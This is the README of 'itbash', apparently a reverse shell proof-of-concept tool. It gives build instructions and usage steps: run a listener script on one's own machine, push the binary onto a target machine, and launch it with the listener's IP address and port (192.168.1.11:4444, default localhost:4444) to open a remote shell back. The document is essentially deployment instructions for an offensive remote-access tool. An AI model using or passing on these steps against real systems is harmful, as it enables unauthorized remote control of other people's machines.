# itbash
Reverse Shell POC (no pipe)

-------

BUILD
=====

Use make to compile the program:
```make```

------

USAGE
=====

On your machine, run the script with the port as first argument:
```bash
./server.sh 4444
```

On the target machine, push itbash. Run the program with address IP/hostname as the first argument and port as second.
```bash
./itbash 192.168.1.11 4444
```

By default *itbash* use localhost and the port 4444.
